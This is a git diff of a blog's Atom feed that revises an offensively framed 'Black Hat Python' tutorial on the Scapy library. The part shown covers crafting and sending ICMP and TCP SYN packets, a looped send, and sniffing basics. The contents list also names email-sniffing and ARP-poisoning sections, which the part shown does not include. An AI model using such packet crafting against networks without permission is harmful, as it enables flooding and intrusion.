@@ -1,26 +1,27 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Higher Bytes by bt3</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/networking.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-12-22T00:00:00-05:00</updated><entry><title>Infinite possibilities with Python's Scapy Module</title><link href="http://bt3gl.github.io/infinite-possibilities-with-pythons-scapy-module.html" rel="alternate"></link><updated>2014-12-22T00:00:00-05:00</updated><author><name>bt3</name></author><id>tag:bt3gl.github.io,2014-12-22:infinite-possibilities-with-pythons-scapy-module.html</id><summary type="html">&lt;p&gt;&lt;a href="http://www.secdev.org/projects/scapy/"&gt;Scapy&lt;/a&gt;  is able to send and capture packets of several protocols, forging and decoding them to be used for most network tasks such as scanning, tracerouting, probing, attacks, and network discovery.&lt;/p&gt;
-&lt;p&gt;In this post I talk about some of my favorite methods and show some of my scripts. But, before we start, make sure you have Scapy in your machine:&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Higher Bytes by bt3</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/networking.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-12-22T00:00:00-05:00</updated><entry><title>Black Hat Python: Infinite possibilities with the Scapy Module</title><link href="http://bt3gl.github.io/black-hat-python-infinite-possibilities-with-the-scapy-module.html" rel="alternate"></link><updated>2014-12-22T00:00:00-05:00</updated><author><name>bt3</name></author><id>tag:bt3gl.github.io,2014-12-22:black-hat-python-infinite-possibilities-with-the-scapy-module.html</id><summary type="html">&lt;p&gt;This is a review about one of my favorites libraries in Python: &lt;a href="http://www.secdev.org/projects/scapy/"&gt;Scapy&lt;/a&gt;, which is a very powerful &lt;strong&gt;packet manipulation&lt;/strong&gt; resource.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Scapy&lt;/strong&gt;  is able to forge and decode packets of several protocols, send and capture them, match requests and replies, and much more. It can be used to handle most network tasks such as scanning, tracerouting, probing, attacks, network discovery, to name a few.&lt;/p&gt;
+&lt;p&gt;Before we start, make sure you have Scapy in your machine:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;pip install scapy
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;You can test the installation firing up Scapy iteratively. These are some useful functions:&lt;/p&gt;
+&lt;p&gt;You can test the installation firing up Scapy iteratively. For example, these are some useful functions:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;scapy
 Welcome to Scapy &lt;span class="o"&gt;(&lt;/span&gt;2.2.0&lt;span class="o"&gt;)&lt;/span&gt;
 &amp;gt;&amp;gt;&amp;gt; ls&lt;span class="o"&gt;()&lt;/span&gt;    ---&amp;gt; list protocols/layers
 &amp;gt;&amp;gt;&amp;gt; lsc&lt;span class="o"&gt;()&lt;/span&gt;   ---&amp;gt; list commands
 &amp;gt;&amp;gt;&amp;gt; conf    ---&amp;gt; Display configurations
-&amp;gt;&amp;gt;&amp;gt; &lt;span class="nb"&gt;help&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;sniff&lt;span class="o"&gt;)&lt;/span&gt;     --&amp;gt; Help &lt;span class="k"&gt;for &lt;/span&gt;a specific &lt;span class="nb"&gt;command&lt;/span&gt;
+&amp;gt;&amp;gt;&amp;gt; &lt;span class="nb"&gt;help&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;sniff&lt;span class="o"&gt;)&lt;/span&gt;     --&amp;gt; Help &lt;span class="k"&gt;for&lt;/span&gt; a specific &lt;span class="nb"&gt;command&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;Contents:&lt;/h3&gt;
+&lt;p&gt;This post is divided as the following:&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;a href="#intro"&gt;Scapy 101 (including sniffing, scanning, fuzzing,...)&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#email"&gt;Stealing Plain Text Email Data&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#arp"&gt;ARP Poisoning a Machine&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="#pcap"&gt;Processing PCAP Files&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#intro"&gt;Scapy 101 (including sniffing, scanning, fuzzing,...)&lt;/a&gt;,&lt;/li&gt;
+&lt;li&gt;&lt;a href="#email"&gt;Stealing Plain Text Email Data&lt;/a&gt;,&lt;/li&gt;
+&lt;li&gt;&lt;a href="#arp"&gt;ARP Poisoning a Machine&lt;/a&gt;, and&lt;/li&gt;
+&lt;li&gt;&lt;a href="#pcap"&gt;Processing PCAP Files&lt;/a&gt;.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;hr /&gt;
 &lt;h1&gt;&lt;a name="intro"&gt;&lt;/a&gt; Scapy 101&lt;/h1&gt;
@@ -66,31 +67,31 @@ Welcome to Scapy &lt;span class="o"&gt;(&lt;/span&gt;2.2.0&lt;span class="o"&gt;
 
 
 &lt;p&gt;We could even go further, adding &lt;em&gt;layer 2 protocols&lt;/em&gt; such as &lt;strong&gt;Ethernet&lt;/strong&gt; or &lt;strong&gt;IEEE 802.11&lt;/strong&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Ether&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Dot1Q&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
-&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;Ether&lt;/span&gt;  &lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x8100&lt;/span&gt; &lt;span class="o"&gt;|&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;Dot1Q&lt;/span&gt;  &lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x800&lt;/span&gt; &lt;span class="o"&gt;|&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;  &lt;span class="o"&gt;|&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
-&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Dot11&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
-&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;Dot11&lt;/span&gt;  &lt;span class="o"&gt;|&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;  &lt;span class="o"&gt;|&amp;gt;&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&amp;gt;&amp;gt;&amp;gt; Ether()/Dot1Q()/IP()
+&amp;lt;Ether  type=0x8100 |&amp;lt;Dot1Q  type=0x800 |&amp;lt;IP  |&amp;gt;&amp;gt;&amp;gt;
+&amp;gt;&amp;gt;&amp;gt; Dot11()/IP()
+&amp;lt;Dot11  |&amp;lt;IP  |&amp;gt;&amp;gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h3&gt;Sending a Packet: Layer 2 vs. Layer 3&lt;/h3&gt;
 &lt;p&gt;Now that we have a (very simple) packet, we can send it over the wire.&lt;/p&gt;
 &lt;p&gt;Scapy's method &lt;a href="http://www.secdev.org/projects/scapy/doc/usage.html#sending-packets"&gt;send&lt;/a&gt;  is used to send a single packet to the IP destination. This is a &lt;em&gt;layer 3&lt;/em&gt; operation, so  the route is based on the local table:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;Sent&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;packets&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&amp;gt;&amp;gt;&amp;gt; send(ip/tcp)
+.
+Sent 1 packets.
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;In another hand, Scapy's method &lt;a href="http://www.secdev.org/projects/scapy/doc/usage.html#sending-packets"&gt;sendp&lt;/a&gt; works in the &lt;em&gt;layer 2&lt;/em&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;sendp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Ether&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="n"&gt;Sent&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;packets&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&amp;gt;&amp;gt;&amp;gt; sendp(Ether()/ip/tcp)
+.
+Sent 1 packets.
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h3&gt;Sending an ICMP Packet&lt;/h3&gt;
-&lt;p&gt;Now let's add some content to our packet. An ICMP packet with a message is created like this:&lt;/p&gt;
+&lt;p&gt;For example, let us create an ICMP packet with some message:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;scapy.all&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
 &lt;span class="n"&gt;packet&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;192.168.1.114&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ICMP&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Helloooo!&amp;quot;&lt;/span&gt;
 &lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
@@ -101,7 +102,7 @@ Welcome to Scapy &lt;span class="o"&gt;(&lt;/span&gt;2.2.0&lt;span class="o"&gt;
 &lt;p&gt;Notice that the method &lt;strong&gt;show()&lt;/strong&gt; displays details about the packet. Running the snippet above gives:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo python send_packet.py
 .
-Sent 1 packets.
+Sent &lt;span class="m"&gt;1&lt;/span&gt; packets.
 &lt;span class="c"&gt;###[ IP ]###&lt;/span&gt;
   &lt;span class="nv"&gt;version&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; 4
   &lt;span class="nv"&gt;ihl&lt;/span&gt;       &lt;span class="o"&gt;=&lt;/span&gt; None
@@ -129,8 +130,13 @@ Sent 1 packets.
 
 &lt;p&gt;This  is how this packet looks like in &lt;a href=""&gt;Wireshark&lt;/a&gt;:
 &lt;img alt="" src="http://i.imgur.com/jjuWHaZ.png" /&gt;&lt;/p&gt;
-&lt;p&gt;To send a packet over several times we add the &lt;strong&gt;loop=1&lt;/strong&gt; argument within the &lt;strong&gt;send&lt;/strong&gt; method:&lt;/p&gt;
+&lt;p&gt;To send the same packet over again we can simply add the &lt;strong&gt;loop=1&lt;/strong&gt; argument within the &lt;strong&gt;send&lt;/strong&gt; method:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;loop&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo python send_packet.py
+.....................................................................................................................
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -138,12 +144,12 @@ Sent 1 packets.
 &lt;p&gt;&lt;img alt="" src="http://i.imgur.com/lv89lc3.png" /&gt;&lt;/p&gt;
 &lt;h3&gt;Sending &amp;amp; Receiving a Packet&lt;/h3&gt;
 &lt;p&gt;Scapy also has the ability to listen for responses to packets it sends (for example, ICMP ping requests).&lt;/p&gt;
-&lt;p&gt;As in the send method, Scapy has two types of packet sending &amp;amp; receiving depending on the network layer.&lt;/p&gt;
+&lt;p&gt;As in the send method, Scapy has two types of packet sending &amp;amp; receiving, based on the network layer.&lt;/p&gt;
 &lt;p&gt;In the &lt;em&gt;layer 3&lt;/em&gt;, the methods are &lt;a href="http://www.secdev.org/projects/scapy/doc/usage.html#send-and-receive-packets-sr"&gt;sr and sr1&lt;/a&gt;. The former returns the answered and unanswered packets, while the last only returns answered and sent packets.&lt;/p&gt;
 &lt;p&gt;In the &lt;em&gt;layer 2&lt;/em&gt;, the methods are &lt;a href="http://www.secdev.org/projects/scapy/doc/usage.html#discussion"&gt;srp and srp1&lt;/a&gt;. The former returns the answered and unanswered packets, while the last only returns answered and sent packets.&lt;/p&gt;
 &lt;p&gt;A good way to remember their differences is to keep in mind that functions with a &lt;strong&gt;1&lt;/strong&gt;  are designed to send the specified packet and &lt;strong&gt;end after receiving 1 answer/response&lt;/strong&gt; (instead of &lt;strong&gt;continuing to listen for answers/responses&lt;/strong&gt;).&lt;/p&gt;
-&lt;h3&gt;Sending &amp;amp; Receiving an ICMP Packet&lt;/h3&gt;
-&lt;p&gt;Let's   build an IP packet carrying an ICMP header  (which has a default type of echo request),  and use the &lt;strong&gt;sr()&lt;/strong&gt; function to transmit the packet and record any response:&lt;/p&gt;
+&lt;h3&gt;Sending &amp;amp; Receiving a ICMP Packet&lt;/h3&gt;
+&lt;p&gt;For example, we can  build an IP packet carrying an ICMP header, which has a default type of echo request, and use the &lt;strong&gt;sr()&lt;/strong&gt; function to transmit the packet and record any response:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;scapy.all&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
 &lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;sr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;google.com&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;ICMP&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
 &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;Output is:&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt;
@@ -152,18 +158,18 @@ Sent 1 packets.
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Running this  snippet results in:&lt;/p&gt;
+&lt;p&gt;Running the above snippet results in:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo python receive_packet.py
 Begin emission:
-.Finished to send 1 packets.
+.Finished to send &lt;span class="m"&gt;1&lt;/span&gt; packets.
 *
-Received 2 packets, got 1 answers, remaining 0 packets
+Received &lt;span class="m"&gt;2&lt;/span&gt; packets, got &lt;span class="m"&gt;1&lt;/span&gt; answers, remaining &lt;span class="m"&gt;0&lt;/span&gt; packets
 
 Output is:
 &lt;span class="o"&gt;(&lt;/span&gt;&amp;lt;Results: TCP:0 UDP:0 ICMP:1 Other:0&amp;gt;, &amp;lt;Unanswered: TCP:0 UDP:0 ICMP:0 Other:0&amp;gt;&lt;span class="o"&gt;)&lt;/span&gt;
 
 Result is:
-&lt;span class="o"&gt;[(&lt;/span&gt;&amp;lt;IP  &lt;span class="nv"&gt;frag&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0 &lt;span class="nv"&gt;proto&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;icmp &lt;span class="nv"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;74.125.228.40 |&amp;lt;ICMP  |&amp;gt;&amp;gt;, &amp;lt;IP  &lt;span class="nv"&gt;version&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;4L &lt;span class="nv"&gt;ihl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;5L &lt;span class="nv"&gt;tos&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0x0 &lt;span class="nv"&gt;len&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;28 &lt;span class="nv"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;9762 &lt;span class="nv"&gt;flags&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;frag&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0L &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;53 &lt;span class="nv"&gt;proto&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;icmp &lt;span class="nv"&gt;chksum&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0x6eff &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;74.125.228.40 &lt;span class="nv"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;192.168.1.114 &lt;span class="nv"&gt;options&lt;/span&gt;&lt;span class="o"&gt;=[]&lt;/span&gt; |&amp;lt;ICMP  &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt;-reply &lt;span class="nv"&gt;code&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0 &lt;span class="nv"&gt;chksum&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0x0 &lt;span class="nv"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0x0 &lt;span class="nv"&gt;seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0x0 |&amp;gt;&amp;gt;&lt;span class="o"&gt;)]&lt;/span&gt;
+&lt;span class="o"&gt;[(&lt;/span&gt;&amp;lt;IP  &lt;span class="nv"&gt;frag&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="nv"&gt;proto&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;icmp &lt;span class="nv"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;74.125.228.40 &lt;span class="p"&gt;|&lt;/span&gt;&amp;lt;ICMP  &lt;span class="p"&gt;|&lt;/span&gt;&amp;gt;&amp;gt;, &amp;lt;IP  &lt;span class="nv"&gt;version&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;4L &lt;span class="nv"&gt;ihl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;5L &lt;span class="nv"&gt;tos&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0x0 &lt;span class="nv"&gt;len&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;28&lt;/span&gt; &lt;span class="nv"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;9762&lt;/span&gt; &lt;span class="nv"&gt;flags&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;frag&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0L &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;53&lt;/span&gt; &lt;span class="nv"&gt;proto&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;icmp &lt;span class="nv"&gt;chksum&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0x6eff &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;74.125.228.40 &lt;span class="nv"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;192.168.1.114 &lt;span class="nv"&gt;options&lt;/span&gt;&lt;span class="o"&gt;=[]&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;&amp;lt;ICMP  &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt;-reply &lt;span class="nv"&gt;code&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="nv"&gt;chksum&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0x0 &lt;span class="nv"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0x0 &lt;span class="nv"&gt;seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0x0 &lt;span class="p"&gt;|&lt;/span&gt;&amp;gt;&amp;gt;&lt;span class="o"&gt;)]&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -174,7 +180,7 @@ RECV 1: IP / ICMP 74.125.228.51 &amp;gt; 192.168.1.114 &lt;span class="nb"&gt;ec
 RECV 1: IP / ICMP 74.125.228.51 &amp;gt; 192.168.1.114 &lt;span class="nb"&gt;echo&lt;/span&gt;-reply 0
 RECV 1: IP / ICMP 74.125.228.51 &amp;gt; 192.168.1.114 &lt;span class="nb"&gt;echo&lt;/span&gt;-reply 0
 
-Sent 3 packets, received 3 packets. 100.0% hits.
+Sent &lt;span class="m"&gt;3&lt;/span&gt; packets, received &lt;span class="m"&gt;3&lt;/span&gt; packets. 100.0% hits.
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -183,50 +189,51 @@ Sent 3 packets, received 3 packets. 100.0% hits.
 &lt;p&gt;Scapy allows you to craft SYN request and match the corresponding returned &lt;a href="http://en.wikipedia.org/wiki/Transmission_Control_Protocol"&gt;SYN/ACK&lt;/a&gt; segment.&lt;/p&gt;
 &lt;p&gt;This is how it works:&lt;/p&gt;
 &lt;p&gt;1) we create an instance of an IP header:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="mf"&gt;192.168.1.114&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="mf"&gt;192.168.1.25&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;ip = IP(src=&amp;#39;192.168.1.114&amp;#39;, dst=&amp;#39;192.168.1.25&amp;#39;)
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;2) we define a SYN instance of the TCP header:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;tcp_syn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TCP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sport&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dport&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flags&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;S&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;12345&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;SYN = TCP(sport=1024, dport=80, flags=&amp;#39;S&amp;#39;, seq=12345)
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;3) we send this and capture the server's response with  &lt;strong&gt;sr1&lt;/strong&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;packet&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp_syn&lt;/span&gt;
-&lt;span class="n"&gt;SYNACK&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sr1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;packet = ip/SYN
+SYNACK = sr1(packet)
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;4) we extract the server's TCP sequence number from the server, with &lt;strong&gt;SYNACK.seq&lt;/strong&gt;, and  increment it by 1:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;ack&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SYNACK&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;seq&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;ack = SYNACK.seq + 1
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;5) we create a new instance of the TCP header &lt;strong&gt;ACK&lt;/strong&gt;, which now has the flag &lt;strong&gt;A&lt;/strong&gt; (placing the acknowledgment  value for the server) and  we send everything out:&lt;/p&gt;
